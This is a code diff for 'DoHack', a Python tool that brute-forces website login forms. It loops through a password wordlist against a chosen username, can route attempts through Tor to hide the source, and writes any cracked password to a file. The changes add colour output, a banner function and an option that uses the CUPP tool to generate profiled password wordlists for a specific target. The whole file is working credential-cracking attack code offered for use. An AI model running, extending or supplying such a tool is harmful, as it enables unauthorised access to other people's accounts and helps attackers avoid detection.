@@ -8,26 +8,27 @@ import socks
 import socket
 import threading
 import time
+import click
 from mechanize import Browser
+from termcolor import colored, cprint
 
-# styles
-if sys.platform.lower() == "win32":
-    os.system('color')
 
-# Group of Different functions for different styles
-class style():
-    BLACK = lambda x: '\033[30m' + str(x)
-    RED = lambda x: '\033[31m' + str(x)
-    GREEN = lambda x: '\033[32m' + str(x)
-    YELLOW = lambda x: '\033[33m' + str(x)
-    BLUE = lambda x: '\033[34m' + str(x)
-    MAGENTA = lambda x: '\033[35m' + str(x)
-    CYAN = lambda x: '\033[36m' + str(x)
-    WHITE = lambda x: '\033[37m' + str(x)
-    UNDERLINE = lambda x: '\033[4m' + str(x)
-    RESET = lambda x: '\033[0m' + str(x)
 
-# End-styles
+def banner():
+    os.system("clear")
+    print ('''
+    ===================================================================
+
+       ╔═╗   ╔═╗┬    ──┐ ┌─┐┬ ┬┌─┐┌┐ ┬ ┬
+       ╠═╣   ║╣ │ ───┌─┘ ├─┤├─┤├─┤├┴┐└┬┘  @  DoHack
+       ╩ ╩ o ╚═╝┴─┘  └── ┴ ┴┴ ┴┴ ┴└─┘ ┴
+
+       follow me in my instagram : •´¯`•.   🎀  [𝑒𝑔𝓎.𝒿𝓈]  🎀   .•`¯´•
+
+       Build By A.ELZAHABY github.com/el3zahaby
+
+    ===================================================================
+    ''')
 
 def runer():
 
@@ -51,7 +52,7 @@ def runer():
     ip =  response.read()
     print ("[DoH#] >>> now your using this ip  :" + ip)
 
-def doHack(type,proxy = False):
+def doHack(type,pwdwordlist = '',proxy = False):
 
     if (proxy == True):
         os.system("sudo service tor start")
@@ -61,12 +62,19 @@ def doHack(type,proxy = False):
 
 
     arr = dict();
+    # arr['website']   = "http://testing-ground.scraping.pro/login"
+    # arr['website_s'] = "http://testing-ground.scraping.pro/login?mode=welcome"
+    # arr['user']      =  "usr"
+    # arr['passw']     = "pwd"
+    # arr['email']     = "admin"
+    # arr['file']      = "/root/pass.txt"
+
     arr['website'] = raw_input('[DoH#] >>> Website Login page URL : ')
     arr['website_s'] = raw_input('[DoH#] >>> Website '+type+' URL after login successfully : ')
     arr['user'] = raw_input('[DoH#] >>> ID or Name of username input : ')
     arr['passw'] = raw_input('[DoH#] >>> ID or Name of password input : ')
     arr['email'] = raw_input("[DoH#] >>> Username or email : ")
-    arr['file'] = raw_input('[DoH#] >>> wordlist file :')
+    arr['file'] = pwdwordlist
     print("===================================================\n\n")
     with open(arr['file'],"r")as list:
             for line in list:
@@ -88,28 +96,17 @@ def doHack(type,proxy = False):
                     outputFile = os.path.expanduser("~/Desktop")+"/"+word+"-"+arr['email']+".log"
                     targetfilefound = open(outputFile, 'w')
                     targetfilefound.write('password: '+ word+'\n\n user: '+ arr['email'])
-                    print(style.GREEN('[DoH#] >>> You will find the outputFile in:'+ outputFile +'\n'))
-                    print(style.GREEN('[DoH#] >>> You will find the outputFile in:'+ outputFile +'\n'))
-                    print (style.GREEN('[DoH#] >>> This is Target password ==> '+word+ '\n'))
-                    print(style.RESET('=============================='))
+                    cprint('[DoH#] >>> You will find the outputFile in:'+ colored(outputFile, 'green', 'on_red') +'\n', 'green', attrs=['bold'])
+
+
+                    cprint('[DoH#] >>> This is Target password ==> '+word+ '\n', 'green', attrs=['bold'])
+
+                    print('==============================')
                     exit()
                 else:
-                    print (style.RED('[DoH#] >>> This is not your  Password ==>'+word))
+                    cprint ('[DoH#] >>> This is not your  Password ==>'+word,'red')
 
-os.system("clear")
-print ('''
-===================================================================
-
-   ╔═╗   ╔═╗┬    ──┐ ┌─┐┬ ┬┌─┐┌┐ ┬ ┬
-   ╠═╣   ║╣ │ ───┌─┘ ├─┤├─┤├─┤├┴┐└┬┘  @  DoHack
-   ╩ ╩ o ╚═╝┴─┘  └── ┴ ┴┴ ┴┴ ┴└─┘ ┴
-
-   follow me in my instagram : •´¯`•.   🎀  [𝑒𝑔𝓎.𝒿𝓈]  🎀   .•`¯´•
-
-   Build By A.ELZAHABY github.com/el3zahaby
-
-===================================================================
-''')
+banner()
 try:
     print ("1) To Start Attack using Redirect URL")
     print ("2) To Start Attack using Redirect URL + with Auto Proxy")
@@ -117,31 +114,36 @@ try:
     print ("4) To Start Attack Using title of Website + with auto Proxy")
     choice = raw_input("[DoH#] >>> ")
 
+    if click.confirm('Do you want to genrate a smart password wordlist?', default=True):
+        #os.system('python3 cupp/cupp.py -h')
+        banner()
+        print ("1) Interactive questions for user password profiling")
+        print ("2) Download huge wordlists from [Mebus/cupp] repository")
+        cuppChoice = raw_input("[DoH#] >>> ")
+
+        if cuppChoice == "1":
+            os.system('python3 cupp/cupp.py -i')
+        if cuppChoice == "2":
+            os.system('python3 cupp/cupp.py -l')
+
+        cuppwordlist = raw_input('\n\n[DoH#] >>> Your smart genrated wordlist file path/name in the RED :')
+    else:
+        cuppwordlist = raw_input('[DoH#] >>> Your wordlist file path/name :')
+
     if choice == "1":
-
-        doHack('redirect')
-
+        doHack('redirect',cuppwordlist)
         print('[DoH#] >>> Sorry Password not found ')
     if choice == "2":
-
-        doHack('redirect',True)
-
+        doHack('redirect',cuppwordlist,True)
         print('[DoH#] >>> Sorry Password not found ')
     if choice =="3":
-
-        doHack('title')
-
+        doHack('title',cuppwordlist)
         print('[DoH#] >>> Sorry Password not found ')
-
     if choice =="4":
-
-        doHack('title',True)
-
+        doHack('title',cuppwordlist,True)
         print('[DoH#] >>> Sorry Password not found ')
     else:
         print("[DoH#] >>> sorry wrong choice Bye :) ")
-    os.system('pdv -t %s % "(epoch_name)" > 123.txt')
-
 except KeyboardInterrupt as e:
     print("EXIT")
     # quit
